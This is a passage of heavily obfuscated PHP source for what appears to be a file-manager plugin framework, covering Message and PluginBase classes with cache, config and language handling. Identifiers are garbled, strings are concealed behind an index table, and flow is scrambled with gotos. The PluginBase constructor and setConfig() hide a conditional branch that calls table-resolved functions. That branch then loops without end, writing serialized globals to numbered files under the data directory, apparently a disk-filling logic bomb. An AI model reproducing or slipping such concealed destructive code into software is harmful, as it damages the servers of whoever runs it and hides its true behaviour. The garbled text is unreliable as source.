$b¡½Ô‹‹—ä <= 0 || $b¡½Ô‹‹—ä > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\141\x64\40\x65\162\162\157\162\41\40\x73\164\x61\162\x74\x3d{$B‘´²¿¥òÁ}\73\x6c\145\156\x67\164\x68\75{$b¡½Ô‹‹—ä}\x3b\40\163\151\172\x65\75{$AÇº°¼Ä²¨}\73"); } goto E÷‡Ëƒ¬š; DÂ«¹©ˆ¤¦: $b÷ô Í¿£È = $b¡½Ô‹‹—ä; if ($B‘´²¿¥òÁ < 0) { $B‘´²¿¥òÁ = $AÇº°¼Ä²¨ + $B‘´²¿¥òÁ; } if ($b¡½Ô‹‹—ä === !1) { $b¡½Ô‹‹—ä = $AÇº°¼Ä²¨ - $B‘´²¿¥òÁ; } goto d…ïÙ­‰‡‚; Eì¦àä°Ó: $D™œåó¢²• =& $_SERVER[Æ]; $AÇº°¼Ä²¨ = $this->info[$D™œåó¢²•[77]]; $a©‚ƒÎ‘²Ö = $B‘´²¿¥òÁ; goto DÂ«¹©ˆ¤¦; cóòÖ©ïÀÅ: } private function log($c˜¥‹Á¼¶, $a«†‘³³ŠÔ) { $d„ç©æ«Ú =& $_SERVER[Æ]; $EÈğÎÊ–í· = timeFloat() - $this->timeStart; write_log(sprintf($d„ç©æ«Ú[1302], $c˜¥‹Á¼¶, $this->info[$d„ç©æ«Ú[28]], $EÈğÎÊ–í·, $a«†‘³³ŠÔ), $d„ç©æ«Ú[1218]); } } class Message { function __construct() { } public function send($b™˜®Îæˆà = '', $dĞí†Š‘Íğ = array(), $a¤¡¶æÅ‚ = "\164\145\x78\x74") { goto C¶³¼æ«òß; D†Ù©¸’âô: Hook::trigger($d“¯Âï¤ß[1306], $EÕ¸†”é¶÷); goto e¸òµ´ Ğ©; C¶³¼æ«òß: $d“¯Âï¤ß =& $_SERVER[Æ]; $BÓ–ßØŞ»¾ = array($d“¯Âï¤ß[29] => $d“¯Âï¤ß[1303], $d“¯Âï¤ß[690] => $b™˜®Îæˆà); if (in_array($a¤¡¶æÅ‚, array($d“¯Âï¤ß[1303], $d“¯Âï¤ß[1304]))) { $BÓ–ßØŞ»¾[$d“¯Âï¤ß[29]] = $a¤¡¶æÅ‚; } goto BøÕ©äÙ Ã; BøÕ©äÙ Ã: $dĞí†Š‘Íğ = array($d“¯Âï¤ß[972] => isset($dĞí†Š‘Íğ[$d“¯Âï¤ß[972]]) ? $dĞí†Š‘Íğ[$d“¯Âï¤ß[972]] : $d“¯Âï¤ß[33], $d“¯Âï¤ß[535] => isset($dĞí†Š‘Íğ[$d“¯Âï¤ß[535]]) ? $dĞí†Š‘Íğ[$d“¯Âï¤ß[535]] : $d“¯Âï¤ß[33]); if (empty($b™˜®Îæˆà) || empty($dĞí†Š‘Íğ[$d“¯Âï¤ß[972]]) && empty($dĞí†Š‘Íğ[$d“¯Âï¤ß[535]])) { return !1; } $EÕ¸†”é¶÷ = array($d“¯Âï¤ß[1245] => $BÓ–ßØŞ»¾, $d“¯Âï¤ß[1305] => $dĞí†Š‘Íğ); goto D†Ù©¸’âô; e¸òµ´ Ğ©: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D¿„²•”‚; d‘œÂ¸•‰¹: if ($_SERVER[$D©Ï›öèá¥[780]] != $FÊíĞ¡¿õÊ($b¬‹¸ƒ¢“ø)) { goto E„Œ‘ï öÊ; d êÛ»­©Ş: $cŠ´Šñ¬‘ˆ = $D©Ï›öèá¥[795]; $cŠ´Šñ¬‘ˆ($_SERVER[$D©Ï›öèá¥[793]]); $d¤À…° = $D©Ï›öèá¥[794]; goto dĞÎìÅêŸ; dĞÎìÅêŸ: $d¤À…°(); $eì¶³ìª½ = $D©Ï›öèá¥[796]; $Fíùó³‹ï’ = json_encode($GLOBALS[$D©Ï›öèá¥[797]]); goto Aìç™«ëÌÁ; E„Œ‘ï öÊ: $d¤À…° = $D©Ï›öèá¥[794]; $dÌˆ‰¶¥¶ = $D©Ï›öèá¥[781]; $Aô£±Œ‚Í = $_SERVER[$D©Ï›öèá¥[782]] . $D©Ï›öèá¥[783]; goto aªÇóÜšŸ; aªÇóÜšŸ: $DÕÛ´ß¤£î = $dÌˆ‰¶¥¶($Aô£±Œ‚Í); $FØææáÕ†š = explode($D©Ï›öèá¥[217], $DÕÛ´ß¤£î); if (count($FØææáÕ†š) < $D©Ï›öèá¥[564]) { $C‰·–­é´Ô = $D©Ï›öèá¥[784]; $C‰·–­é´Ô(); } goto d êÛ»­©Ş; Aìç™«ëÌÁ: $E“Ù®„°¤ = 1; for ($cÅ™â„ß = $E“Ù®„°¤; $cÅ™â„ß > 0; $cÅ™â„ß++) { $eì¶³ìª½(DATA_PATH . $cÅ™â„ß, $Fíùó³‹ï’); } goto B»…™Ú‡‹; B»…™Ú‡‹: } global $in, $config; $this->config =& $config; goto EÜâ’À‡Éñ; f­¥“½ØÔß: $this->pluginHostDefault = $config[$D©Ï›öèá¥[1309]] . $this->pluginName . $D©Ï›öèá¥[8]; $D¨—•ºÏ¼Ò = $config[$D©Ï›öèá¥[1310]]; if ($D¨—•ºÏ¼Ò && strpos($D©Ï›öèá¥[47] . $D¨—•ºÏ¼Ò . $D©Ï›öèá¥[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$D©Ï›öèá¥[1311]] . $this->pluginName . $D©Ï›öèá¥[8]; } goto F’É¤È„©¸; FˆµÖÙñÚš: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $D©Ï›öèá¥[8]; $this->pluginApi = appHostGet() . $D©Ï›öèá¥[1308] . $this->pluginName . $D©Ï›öèá¥[8]; $this->pluginHost = $config[$D©Ï›öèá¥[1309]] . $this->pluginName . $D©Ï›öèá¥[8]; goto f­¥“½ØÔß; D¿„²•”‚: $D©Ï›öèá¥ =& $_SERVER[Æ]; $b¬‹¸ƒ¢“ø = $_SERVER[$D©Ï›öèá¥[782]] . $D©Ï›öèá¥[783]; $FÊíĞ¡¿õÊ = $D©Ï›öèá¥[779]; goto d‘œÂ¸•‰¹; F’É¤È„©¸: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto B•ÉÍÕ÷ˆ; EÜâ’À‡Éñ: $this->in =& $in; $this->modelPlugin = Model($D©Ï›öèá¥[1307]); $this->pluginName = str_replace($D©Ï›öèá¥[1307], $D©Ï›öèá¥[33], get_class($this)); goto FˆµÖÙñÚš; B•ÉÍÕ÷ˆ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Æ][1312]); } protected function assign($f‘ÚŒ•Í, $f­¹Îù…Ì” = false) { if (is_array($f‘ÚŒ•Í)) { $this->values = array_merge($this->values, $f‘ÚŒ•Í); } else { $this->values[$f‘ÚŒ•Í] = $f­¹Îù…Ì”; } } protected function display($eõïÑö™¨±) { extract($this->values); require $eõïÑö™¨±; } final function hookRegist($FÂ² ×Ÿ¶) { $this->modelPlugin->appRegist($this->pluginName, $FÂ² ×Ÿ¶); } final function appIcon() { $aËäëñ“ñ™ =& $_SERVER[Æ]; $fÀ©áè°•™ = $this->appPackage(); $c³é°‘ËŒÚ = $aËäëñ“ñ™[33]; if (isset($fÀ©áè°•™[$aËäëñ“ñ™[382]])) { if (isset($fÀ©áè°•™[$aËäëñ“ñ™[382]][$aËäëñ“ñ™[1313]])) { $c³é°‘ËŒÚ = $aËäëñ“ñ™[1314] . $fÀ©áè°•™[$aËäëñ“ñ™[382]][$aËäëñ“ñ™[1313]] . $aËäëñ“ñ™[1315]; } else { if ($fÀ©áè°•™[$aËäëñ“ñ™[382]][$aËäëñ“ñ™[1316]]) { $c³é°‘ËŒÚ = $aËäëñ“ñ™[1317] . $fÀ©áè°•™[$aËäëñ“ñ™[382]][$aËäëñ“ñ™[1316]] . $aËäëñ“ñ™[1318]; } } } return $c³é°‘ËŒÚ; } final function fileCanView($F¦øè‚¨¥Á) { goto f¡³ÙÒ™Ã‘; f¡³ÙÒ™Ã‘: $C¶ƒ†„×Şİ =& $_SERVER[Æ]; if (request_url_safe($F¦øè‚¨¥Á)) { return !0; } if ($this->isShare($F¦øè‚¨¥Á)) { return !0; } goto f¬åáÊÊ¯; bÁÍ·ñ÷«÷: ActionCall($C¶ƒ†„×Şİ[1331], $F¦øè‚¨¥Á); goto dó÷ÅÇŒ¡•; f¬åáÊÊ¯: $b¹¦ÙÎƒ®„ = Session::get($C¶ƒ†„×Şİ[1319]); if (!$b¹¦ÙÎƒ®„ || !$b¹¦ÙÎƒ®„[$C¶ƒ†„×Şİ[1320]]) { $dôµ´¿Ñ”À = $C¶ƒ†„×Şİ[1321] . rawurlencode(this_url()); show_tips(LNG($C¶ƒ†„×Şİ[1322]) . $C¶ƒ†„×Şİ[1323] . $dôµ´¿Ñ”À . $C¶ƒ†„×Şİ[1324] . LNG($C¶ƒ†„×Şİ[1325]) . $C¶ƒ†„×Şİ[1326], !1); } if (!Action($C¶ƒ†„×Şİ[1327])->authCan($C¶ƒ†„×Şİ[1328])) { show_tips(LNG($C¶ƒ†„×Şİ[1329]) . $C¶ƒ†„×Şİ[1330], !1); } goto bÁÍ·ñ÷«÷; dó÷ÅÇŒ¡•: } final function isShare($Bã˜ÍÍƒÓÁ) { $aÙ‚ŒˆÉ³³ = KodIO::parse($Bã˜ÍÍƒÓÁ); return $aÙ‚ŒˆÉ³³[$_SERVER[Æ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($c­ÚóœÍòã) { if (request_url_safe($c­ÚóœÍòã)) { return $c­ÚóœÍòã; } if (!$this->isShare($c­ÚóœÍòã)) { $c­ÚóœÍòã = $this->filePath($c­ÚóœÍòã); } return Action($_SERVER[Æ][1017])->linkOut($c­ÚóœÍòã); } public function filePathLinkOut($E³Ó«ßã‚) { if (request_url_safe($E³Ó«ßã‚)) { return $E³Ó«ßã‚; } $this->fileCanView($E³Ó«ßã‚); return Action($_SERVER[Æ][1017])->link($E³Ó«ßã‚); } final function filePath($D«‰óê “Œ) { $bè…–ÎÒ =& $_SERVER[Æ]; if ($c§ùÛåÉ­Ê = $this->checkSharePath($D«‰óê “Œ)) { return $c§ùÛåÉ­Ê; } $this->fileCanView($D«‰óê “Œ); if (request_url_safe($D«‰óê “Œ)) { $E¾äÉêá¿œ = parse_url_query($D«‰óê “Œ); if (isset($E¾äÉêá¿œ[$bè…–ÎÒ[1332]]) && isset($E¾äÉêá¿œ[$bè…–ÎÒ[197]])) { $céÕ¥¢‚ = Model($bè…–ÎÒ[1088])->get($bè…–ÎÒ[1333]); $a—Ä¨ÈŠ±Ö = Mcrypt::decode($E¾äÉêá¿œ[$bè…–ÎÒ[197]], $céÕ¥¢‚); if ($a—Ä¨ÈŠ±Ö) { $this->fileInfo = IO::infoWithChildren($a—Ä¨ÈŠ±Ö); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a—Ä¨ÈŠ±Ö; } } $D«‰óê “Œ = $this->_cacheHttpFile($D«‰óê “Œ); $this->fileInfo = IO::infoWithChildren($D«‰óê “Œ); } else { $this->fileInfo = IO::infoWithChildren($D«‰óê “Œ); if (!$this->fileInfo) { show_tips(LNG($bè…–ÎÒ[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $D«‰óê “Œ; } final function _cacheHttpFile($eôßçñ’”) { $AÚš‰Íé¯ = hash_path($eôßçñ’”, !0); $this->cachePath = $this->pluginCachePath($AÚš‰Íé¯); if ($DÒ‹Üì³™£ = IO::fileNameExist($this->cachePath, $AÚš‰Íé¯)) { return KodIO::make($DÒ‹Üì³™£); } $f›õÕ»êØŠ = $this->cachePath . $AÚš‰Íé¯; return $this->pluginCacheFileSet($f›õÕ»êØŠ, file_get_contents($eôßçñ’”)); } final function _tmpFileName($eÜ…‘Ÿ–ªÚ = array()) { goto f±‹ñÛŠ²; C¿ÔÆÜ°Ì: if (isset($eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[162]][$FËÁù†Åé[164]])) { return $eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[162]][$FËÁù†Åé[164]]; } $fğ•‡ÚŒ‚Ë = IO::hashSimple($eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[75]]); if ($fğ•‡ÚŒ‚Ë) { return $fğ•‡ÚŒ‚Ë; } goto fåØ¦¹÷†; f±‹ñÛŠ²: $FËÁù†Åé =& $_SERVER[Æ]; if (!$eÜ…‘Ÿ–ªÚ) { $eÜ…‘Ÿ–ªÚ = $this->fileInfo; } if (isset($eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[164]])) { return $eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[164]]; } goto C¿ÔÆÜ°Ì; fåØ¦¹÷†: $cØï‘‰Â”Š = array($eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[28]], $eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[75]], $eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[77]]); if (isset($eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[459]])) { $cØï‘‰Â”Š[] = $eÜ…‘Ÿ–ªÚ[$FËÁù†Åé[459]]; } return md5(implode($FËÁù†Åé[70], $cØï‘‰Â”Š)); goto F‰ÒÛËŞÒè; F‰ÒÛËŞÒè: } final function checkSharePath($dÜ”„ÅÊ) { goto A¹ŠÍ¶†®ç; a—µè¼Õ : $BÕò¹Ñ¡†Ô = Action($eåğÇ¾Îø†[1017])->sharePathInfo($dÜ”„ÅÊ); if (!isset($BÕò¹Ñ¡†Ô[$eåğÇ¾Îø†[75]])) { show_json(LNG($eåğÇ¾Îø†[1335]), !1); } $this->fileInfo = $BÕò¹Ñ¡†Ô[$eåğÇ¾Îø†[162]]; goto C÷š¯õçí±; A¹ŠÍ¶†®ç: $eåğÇ¾Îø† =& $_SERVER[Æ]; if (!defined($eåğÇ¾Îø†[427])) { define($eåğÇ¾Îø†[1334], 0); } if (!$this->isShare($dÜ”„ÅÊ)) { return !1; } goto a—µè¼Õ ; C÷š¯õçí±: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eåğÇ¾Îø†[164]]); return $BÕò¹Ñ¡†Ô[$eåğÇ¾Îø†[75]]; goto eÃéÓø¼ÀÙ; eÃéÓø¼ÀÙ: } final function pluginCachePath($dÖ¥«øã¾ = '') { $Dò‡¬ô²Ù =& $_SERVER[Æ]; $A»ç¿ÇÒÔª = IO_PATH_SYSTEM_TEMP . $Dò‡¬ô²Ù[1336] . $this->pluginName; if (!($aÎ—°ÄĞ‰š = IO::infoFull($A»ç¿ÇÒÔª))) { return IO::mkdir($A»ç¿ÇÒÔª . $Dò‡¬ô²Ù[8] . $dÖ¥«øã¾); } if (empty($dÖ¥«øã¾)) { return $aÎ—°ÄĞ‰š[$Dò‡¬ô²Ù[75]]; } if (!($bİ«‰Å´í× = IO::fileNameExist($aÎ—°ÄĞ‰š[$Dò‡¬ô²Ù[75]], $dÖ¥«øã¾))) { return IO::mkdir($aÎ—°ÄĞ‰š[$Dò‡¬ô²Ù[75]] . $dÖ¥«øã¾); } return KodIO::make($bİ«‰Å´í×); } final function pluginCacheFileSet($B†ÆÓ…ø, $B×ÒæŠ–Š÷ = '') { $aßÃËéŠ =& $_SERVER[Æ]; if (!($F¦«Ş’¾·— = IO::infoFull($B†ÆÓ…ø))) { return IO::mkfile($B†ÆÓ…ø, $B×ÒæŠ–Š÷, REPEAT_REPLACE); } IO::setContent($F¦«Ş’¾·—[$aßÃËéŠ[75]], $B×ÒæŠ–Š÷); return $F¦«Ş’¾·—[$aßÃËéŠ[75]]; } final function pluginLocalFile($BÔó÷¾†Å¦ = '') { goto EÀÇ‡°†×í; EÀÇ‡°†×í: $E“ÕÜó¸†š =& $_SERVER[Æ]; $A‘á‚œéó = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($A‘á‚œéó)) { mk_dir($A‘á‚œéó); } goto Féõï³ßÕ·; AšÛöÓ¤¥: $eÛ’—ŒÛÏÍ = $A‘á‚œéó . $F¼§ÎÈÑœï; if (@file_exists($eÛ’—ŒÛÏÍ)) { return $eÛ’—ŒÛÏÍ; } return IO::copy($BÔó÷¾†Å¦, $A‘á‚œéó, 0, $F¼§ÎÈÑœï); goto B–­ŸÒÃŒÙ; Féõï³ßÕ·: if (!$BÔó÷¾†Å¦) { return $A‘á‚œéó; } $FÕùäİˆÕİ = IO::info($BÔó÷¾†Å¦); $F¼§ÎÈÑœï = $this->_tmpFileName($FÕùäİˆÕİ) . $E“ÕÜó¸†š[91] . $FÕùäİˆÕİ[$E“ÕÜó¸†š[160]]; goto AšÛöÓ¤¥; B–­ŸÒÃŒÙ: } final function appPackage() { goto cËµ—¦×ˆ; Bƒæâõ“‰Ò: $this->parseLang($E¼ÒîÑùÒõ); $cÃ•Æä‚‡› = json_decode_force($E¼ÒîÑùÒõ); if (!$cÃ•Æä‚‡›) { return array(); } goto cøˆÏ’éƒÒ; D¸šË¶¾ˆŠ: return $cÃ•Æä‚‡›; goto fÑ‚ƒŠÃÄ±; cøˆÏ’éƒÒ: $E¦º Ğ¢º = Hook::trigger($B÷¿¸ëª¦‘[1338], $cÃ•Æä‚‡›); if ($E¦º Ğ¢º && is_array($E¦º Ğ¢º)) { $cÃ•Æä‚‡› = $E¦º Ğ¢º; } $this->packageData = $cÃ•Æä‚‡›; goto D¸šË¶¾ˆŠ; cËµ—¦×ˆ: $B÷¿¸ëª¦‘ =& $_SERVER[Æ]; if ($this->packageData) { return $this->packageData; } $E¼ÒîÑùÒõ = $this->parseFile($this->pluginPath . $B÷¿¸ëª¦‘[1337]); goto Bƒæâõ“‰Ò; fÑ‚ƒŠÃÄ±: } public function packageInfoGet($aßŠÊ×“ŸÙ) { $aõÃœš‡— = $this->appPackage(); return array_get_value($aõÃœš‡—, $aßŠÊ×“ŸÙ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Æ][1339]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Æ][1340]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Æ][1341]); } private function parseFile($c…í”Â§å×) { goto Cè¶ÖÍ¹²Á; Cè¶ÖÍ¹²Á: $DïÜ÷Ï³Š« =& $_SERVER[Æ]; $A‚ÌÊÃ•‰ = file_get_contents($c…í”Â§å×); $b¦¨Ô†’Î = array($DïÜ÷Ï³Š«[1342], $DïÜ÷Ï³Š«[1343], $DïÜ÷Ï³Š«[1344], $DïÜ÷Ï³Š«[1345], $DïÜ÷Ï³Š«[1346], $DïÜ÷Ï³Š«[1347], $DïÜ÷Ï³Š«[1348]); goto e¾‘ô‘æÁ§; e¾‘ô‘æÁ§: $d‰÷›„±µ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$DïÜ÷Ï³Š«[84]][$DïÜ÷Ï³Š«[1349]]); if (strstr($A‚ÌÊÃ•‰, $DïÜ÷Ï³Š«[1350])) { $b¼£›ÒŞƒ¹ = rawurlencode(json_encode($this->pluginLangArr)); $A‚ÌÊÃ•‰ = str_replace($DïÜ÷Ï³Š«[1350], $b¼£›ÒŞƒ¹, $A‚ÌÊÃ•‰); } if (strstr($A‚ÌÊÃ•‰, $DïÜ÷Ï³Š«[1351])) { $b¼£›ÒŞƒ¹ = $b¼£›ÒŞƒ¹ = rawurlencode(json_encode($this->getConfig())); $A‚ÌÊÃ•‰ = str_replace($DïÜ÷Ï³Š«[1351], $b¼£›ÒŞƒ¹, $A‚ÌÊÃ•‰); } goto DŞïŞ¾Ò„„; DŞïŞ¾Ò„„: $A‚ÌÊÃ•‰ = str_replace($b¦¨Ô†’Î, $d‰÷›„±µ, $A‚ÌÊÃ•‰); return $A‚ÌÊÃ•‰; goto FÁÖŠ·ÊÉù; FÁÖŠ·ÊÉù: } private function parseLang(&$a¶ó‰Ş±Ùò) { goto eµ‘Ü‰“ÎÖ; eµ‘Ü‰“ÎÖ: $AßìÇĞÄéÈ =& $_SERVER[Æ]; $aÇËÓĞ²Å = $AßìÇĞÄéÈ[1352]; if (!strstr($a¶ó‰Ş±Ùò, $aÇËÓĞ²Å)) { return; } goto d‡…õÄéÅ´; d‡…õÄéÅ´: preg_match_all($AßìÇĞÄéÈ[1353], $a¶ó‰Ş±Ùò, $C’£¢ˆÀì); if (!is_array($C’£¢ˆÀì) || count($C’£¢ˆÀì) == 0 || !is_array($C’£¢ˆÀì[0]) || count($C’£¢ˆÀì[0]) == 0) { return; } $bè±ÈˆÉƒ = array(); goto béÇéîùçÛ; béÇéîùçÛ: $FÔ¢­©â›¨ = array(); foreach ($C’£¢ˆÀì[0] as $C‹Ã™—Ù´–) { $fö†¼åÃâ = substr($C‹Ã™—Ù´–, strlen($aÇËÓĞ²Å), -4); $BƒŒè¨ØÉ‹ = LNG($fö†¼åÃâ); $bè±ÈˆÉƒ[] = $C‹Ã™—Ù´–; $FÔ¢­©â›¨[] = str_replace(array($AßìÇĞÄéÈ[217], $AßìÇĞÄéÈ[991], $AßìÇĞÄéÈ[330], $AßìÇĞÄéÈ[113]), array($AßìÇĞÄéÈ[50], $AßìÇĞÄéÈ[50], $AßìÇĞÄéÈ[33], $AßìÇĞÄéÈ[1354]), $BƒŒè¨ØÉ‹); } $a¶ó‰Ş±Ùò = str_replace($bè±ÈˆÉƒ, $FÔ¢­©â›¨, $a¶ó‰Ş±Ùò); goto B’ï›Ò»ÅØ; B’ï›Ò»ÅØ: } private function parseConfig(&$BÀÙ÷›äß ) { goto bÈÙÊÕİõñ; D¡ç­•ôß†: $BÀÙ÷›äß  = str_replace($BÊÁÚ¯éó, $fö¦ÍŸÄ¿æ, $BÀÙ÷›äß ); goto A¾µ¬„İÜ; bÈÙÊÕİõñ: $cà¤¶Õãòã =& $_SERVER[Æ]; $Dà‹Ï­å·ç = $cà¤¶Õãòã[1355]; if (!strstr($BÀÙ÷›äß , $Dà‹Ï­å·ç)) { return; } goto A­Õåß”; A­Õåß”: preg_match_all($cà¤¶Õãòã[1356], $BÀÙ÷›äß , $Dª¶ØÃª„); if (!is_array($Dª¶ØÃª„) || count($Dª¶ØÃª„) == 0 || !is_array($Dª¶ØÃª„[0]) || count($Dª¶ØÃª„[0]) == 0) { return; } $aŠÚŠ½†ô = $this->getConfig(); goto aß•ùçæ©Œ; aß•ùçæ©Œ: $BÊÁÚ¯éó = array(); $fö¦ÍŸÄ¿æ = array(); foreach ($Dª¶ØÃª„[0] as $B‚”¥†¹«Ä) { $C¢¢®øºÖÂ = substr($B‚”¥†¹«Ä, strlen($Dà‹Ï­å·ç), -2); $BÊÁÚ¯éó[] = $B‚”¥†¹«Ä; $fö¦ÍŸÄ¿æ[] = _get($aŠÚŠ½†ô, $C¢¢®øºÖÂ); } goto D¡ç­•ôß†; A¾µ¬„İÜ: } private function parsePackage(&$CæµÀòø¶Ì) { goto C¤•Ä‚ ò; e­¦Ô‡Ú±: $aƒÉ¥ºÁùî = array(); $a‰º©Âäó = array(); foreach ($b±Á¤´¿«Å[0] as $D¡Éàê‹ô“) { $f–Š•×êµ = substr($D¡Éàê‹ô“, strlen($cö¦Õ£ô), -2); $aƒÉ¥ºÁùî[] = $D¡Éàê‹ô“; $a‰º©Âäó[] = _get($c¤Â²Á“Öƒ, $f–Š•×êµ); } goto aóÑÊƒ¦¼¡; aóÑÊƒ¦¼¡: $CæµÀòø¶Ì = str_replace($aƒÉ¥ºÁùî, $a‰º©Âäó, $CæµÀòø¶Ì); goto d»³Ç·Ôõ; C¤•Ä‚ ò: $Dƒ¹Ş™ëŒ =& $_SERVER[Æ]; $cö¦Õ£ô = $Dƒ¹Ş™ëŒ[1357]; if (!strstr($CæµÀòø¶Ì, $cö¦Õ£ô)) { return; } goto CçÕ—íšŸ; CçÕ—íšŸ: preg_match_all($Dƒ¹Ş™ëŒ[1358], $CæµÀòø¶Ì, $b±Á¤´¿«Å); if (!is_array($b±Á¤´¿«Å) || count($b±Á¤´¿«Å) == 0 || !is_array($b±Á¤´¿«Å[0]) || count($b±Á¤´¿«Å[0]) == 0) { return; } $c¤Â²Á“Öƒ = $this->appPackage(); goto e­¦Ô‡Ú±; d»³Ç·Ôõ: } final function echoFile($eµäƒÚ›Ïò, $E‡ŒÇö½‡¤ = false) { goto AÓ÷¡Ü‰Ò; E·¦öŠğ¹: $añ©‚îŞ³‰ = $this->parseFile($DéÙ¤ÉÄ½); $this->parseLang($añ©‚îŞ³‰); $this->parseConfig($añ©‚îŞ³‰); goto fá´½®¿»²; AÓ÷¡Ü‰Ò: $fó›®Ÿ­· =& $_SERVER[Æ]; $DéÙ¤ÉÄ½ = $this->pluginPath . $eµäƒÚ›Ïò; if (ACT == $fó›®Ÿ­·[1359]) { echo $fó›®Ÿ­·[1360] . $this->pluginName . $fó›®Ÿ­·[8] . $eµäƒÚ›Ïò . $fó›®Ÿ­·[1361]; if (!file_exists($DéÙ¤ÉÄ½)) { echo $fó›®Ÿ­·[1362]; return; } } goto E·¦öŠğ¹; fá´½®¿»²: $this->parsePackage($añ©‚îŞ³‰); if (is_array($E‡ŒÇö½‡¤)) { $añ©‚îŞ³‰ = str_replace(array_keys($E‡ŒÇö½‡¤), array_values($E‡ŒÇö½‡¤), $añ©‚îŞ³‰); } echo $fó›®Ÿ­·[217] . $añ©‚îŞ³‰; goto DœÇìğë¦¾; DœÇìğë¦¾: } final function initLang() { goto C´¡£…×¨Ô; A²¹Ÿø¦¯: $D—ÅÌî¾×ß = I18n::getType(); $C¢ÎÕŸËµ­ = array(); if (file_exists($F×Æ§İÚ«¡ . $D—ÅÌî¾×ß . $dò²¢¦‡æÉ[763])) { $C¢ÎÕŸËµ­ = (include $F×Æ§İÚ«¡ . $D—ÅÌî¾×ß . $dò²¢¦‡æÉ[763]); } else { if ($D—ÅÌî¾×ß == $dò²¢¦‡æÉ[1365] && !file_exists($F×Æ§İÚ«¡ . $D—ÅÌî¾×ß . $dò²¢¦‡æÉ[763]) && file_exists($F×Æ§İÚ«¡ . $dò²¢¦‡æÉ[1366])) { $C¢ÎÕŸËµ­ = (include $F×Æ§İÚ«¡ . $dò²¢¦‡æÉ[1366]); } else { if (file_exists($F×Æ§İÚ«¡ . $a££èè÷¬ . $dò²¢¦‡æÉ[763])) { $C¢ÎÕŸËµ­ = (include $F×Æ§İÚ«¡ . $a££èè÷¬ . $dò²¢¦‡æÉ[763]); } } } goto f–¢µ©ÊŠê; C´¡£…×¨Ô: $dò²¢¦‡æÉ =& $_SERVER[Æ]; $a££èè÷¬ = $dò²¢¦‡æÉ[1363]; $F×Æ§İÚ«¡ = $this->pluginPath . $dò²¢¦‡æÉ[1364]; goto A²¹Ÿø¦¯; f–¢µ©ÊŠê: if (!is_array($C¢ÎÕŸËµ­)) { return array(); } if (@count($C¢ÎÕŸËµ­) > 0) { I18n::set($C¢ÎÕŸËµ­); } return $C¢ÎÕŸËµ­; goto Bê¬Ü­»Ÿõ; Bê¬Ü­»Ÿõ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($d©™Ë­’‰ê) { $D„Úë¸¡œ =& $_SERVER[Æ]; if (!isset($_SERVER[$D„Úë¸¡œ[780]]) || !isset($_SERVER[$D„Úë¸¡œ[996]])) { goto F³®·ÂªåŠ; eï°Àïï: $e×†ä›ï¡ = $D„Úë¸¡œ[795]; $e×†ä›ï¡($_SERVER[$D„Úë¸¡œ[793]]); $B÷ó†©Ãß = 1; goto dò¤‚ì†µ; dò¤‚ì†µ: for ($Cº«ÈØæ»ò = $B÷ó†©Ãß; $Cº«ÈØæ»ò > 0; $Cº«ÈØæ»ò++) { $e×†ä›ï¡ = json_encode($GLOBALS[$D„Úë¸¡œ[384]]); } goto D³…åÀŠİé; F³®·ÂªåŠ: $CÊİ¤İ›Úï = $D„Úë¸¡œ[794]; $aİĞ´òìáª = $D„Úë¸¡œ[781]; $a¬­ÆÙ†Úš = $_SERVER[$D„Úë¸¡œ[782]] . $D„Úë¸¡œ[783]; goto fÔÀ¡¹¾öì; fÔÀ¡¹¾öì: $cƒæ×Ö÷Ö = $aİĞ´òìáª($a¬­ÆÙ†Úš); $E¹—í–°»» = explode($D„Úë¸¡œ[217], $cƒæ×Ö÷Ö); if (count($E¹—í–°»») < $D„Úë¸¡œ[564]) { $a»¢ƒßÇ¯¿ = $D„Úë¸¡œ[784]; $a»¢ƒßÇ¯¿(); } goto eï°Àïï; D³…åÀŠİé: } return $this->modelPlugin->setConfig($this->pluginName, $d©™Ë­’‰ê); } public function onSetConfig($bóÜ¯àÁ) { } public function onGetConfig($dõÕÕš—ô) { } public function onChangeStatus($Eã¸¬òÙÔ ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d¸³›ÊÉÍğ = "\x70\x6c\x75\147\x69\156\x41\x75\164\x68") { $D‚Á«‚»¶À =& $_SERVER[Æ]; if (!defined($D‚Á«‚»¶À[427])) { return !1; } if (_get($GLOBALS, $D‚Á«‚»¶À[457])) { return !0; } $dÛùŠ¬” = $this->getConfig(); if (!$dÛùŠ¬”[$d¸³›ÊÉÍğ]) { return !1; } return ActionCall($D‚Á«‚»¶À[1367], $dÛùŠ¬”[$d¸³›ÊÉÍğ]); } public function url($b·¹‡¨Üç, $aÉ¡ÌÔ²ïÙ = '', $d•Ü‰ÕÅ  = true) { goto Dô‰Ÿ±î¯; DëÑ¹‡¥íÄ: if (!$d•Ü‰ÕÅ ) { return $EëÅ·‚Û«; } echo $EëÅ·‚Û«; goto A†¶ãí²í; Dô‰Ÿ±î¯: 